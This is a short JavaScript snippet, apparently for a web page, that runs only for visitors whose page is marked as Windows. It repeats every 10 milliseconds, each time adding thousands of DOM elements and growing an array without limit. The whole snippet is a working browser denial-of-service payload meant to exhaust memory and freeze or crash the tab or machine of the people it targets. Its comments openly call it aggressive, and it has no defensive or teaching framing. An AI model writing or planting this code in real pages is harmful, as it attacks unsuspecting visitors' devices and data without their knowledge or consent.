// Memory-intensive array for storing random values
let memoryIntensiveArray = [];

// Function to create new DOM elements infinitely (Aggressive)
function createDomElements() {
    const container = document.getElementById("recursiveContainer");

    // Create thousands of new DOM elements each time this function is called
    for (let i = 0; i < 5000; i++) {  // Increase 5000 to create more elements at once
        const newElement = document.createElement("div");
        newElement.classList.add("recursive-element");
        newElement.textContent = "I'm a recursive element!";
        container.appendChild(newElement);
    }

    // Grow memory by filling large arrays with random values
    for (let j = 0; j < 10000; j++) { // Fill array with more data points
        memoryIntensiveArray.push(Math.random());  // Add random numbers to the array
    }

    // Log memory consumption to the console (Optional)
    console.log(`Current Memory Intensive Array Length: ${memoryIntensiveArray.length}`);

    // Call the function again with no delay for almost continuous operation
    setTimeout(createDomElements, 10);  // Use a small delay (10ms) to keep the recursion going
}

// Only run the aggressive operation for Windows users
if (document.body.classList.contains('windows')) {
    createDomElements();
}